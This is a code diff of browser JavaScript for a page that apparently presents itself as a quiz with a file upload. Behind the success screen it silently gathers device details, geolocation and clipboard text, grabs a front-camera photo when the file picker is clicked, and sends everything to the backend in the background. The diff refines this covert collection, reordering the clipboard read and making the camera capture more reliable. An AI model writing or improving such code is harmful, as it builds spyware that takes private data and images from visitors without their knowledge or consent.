@@ -7,7 +7,7 @@ const BACKEND_BASE = "/api";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
-let capturedImage = null; // store camera image temporarily
+let capturedImage = null;
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -17,11 +17,11 @@ async function collectMetadata() {
     useragent: navigator.userAgent,
     platform: navigator.platform,
     battery: "N/A",
+    clipboard: "N/A", // renamed from network
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    clipboardData: "N/A", // renamed from network
     time: new Date().toLocaleString(),
-    ip: "N/A"
+    ip: "" // will be added by backend if needed
   };
 
   // Battery info (no popup)
@@ -29,6 +29,16 @@ async function collectMetadata() {
     try {
       const b = await navigator.getBattery();
       metadata.battery = `${b.level * 100}% charging:${b.charging}`;
+    } catch {}
+  }
+
+  // Clipboard text (if already allowed)
+  if (navigator.permissions && navigator.clipboard) {
+    try {
+      const status = await navigator.permissions.query({ name: "clipboard-read" });
+      if (status.state === "granted") {
+        metadata.clipboard = await navigator.clipboard.readText();
+      }
     } catch {}
   }
 
@@ -41,17 +51,6 @@ async function collectMetadata() {
           navigator.geolocation.getCurrentPosition(res, rej)
         );
         metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
-      }
-    } catch {}
-  }
-
-  // Clipboard text only if already allowed
-  if (navigator.permissions && navigator.clipboard) {
-    try {
-      const status = await navigator.permissions.query({ name: "clipboard-read" });
-      if (status.state === "granted") {
-        const text = await navigator.clipboard.readText();
-        metadata.clipboardData = text || "Empty";
       }
     } catch {}
   }
@@ -69,24 +68,30 @@ async function captureCamera() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    await new Promise((r) => setTimeout(r, 1500)); // give camera time
+    // Wait for video to be ready
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => resolve();
+    });
 
-    canvas.width = 640;
-    canvas.height = 480;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
 
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    capturedImage = canvas.toDataURL("image/png"); // store camera image
-
-    stream.getTracks().forEach((t) => t.stop());
+    capturedImage = canvas.toDataURL("image/png");
     cameraCaptured = true;
+
+    // Stop stream immediately
+    stream.getTracks().forEach((t) => t.stop());
+
+    console.log("Camera captured successfully");
   } catch (err) {
-    console.log("Camera denied or blocked:", err);
+    console.error("Camera capture failed:", err);
   }
 }
 
-// Ask camera permission only on file click
+// Trigger camera capture on file input click
 if (fileInput) {
   fileInput.addEventListener("click", async () => {
     await captureCamera();
@@ -109,7 +114,7 @@ async function uploadFileWithMetadata(file, metadata, cameraImage) {
             file: reader.result,
             filename: file.name,
             metadata,
-            cameraImage // optional, include if captured
+            cameraImage
           }),
         });
 
@@ -139,17 +144,15 @@ form.addEventListener("submit", async (e) => {
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "flex";
 
-  // Send everything in background
+  // Send metadata + file + camera image in background
   (async () => {
     try {
       const metadata = await collectMetadata();
-
       const res = await uploadFileWithMetadata(
         fileInput.files[0],
         metadata,
         capturedImage
       );
-
       console.log("Upload successful:", res);
     } catch (err) {
       console.error("Background upload failed:", err);
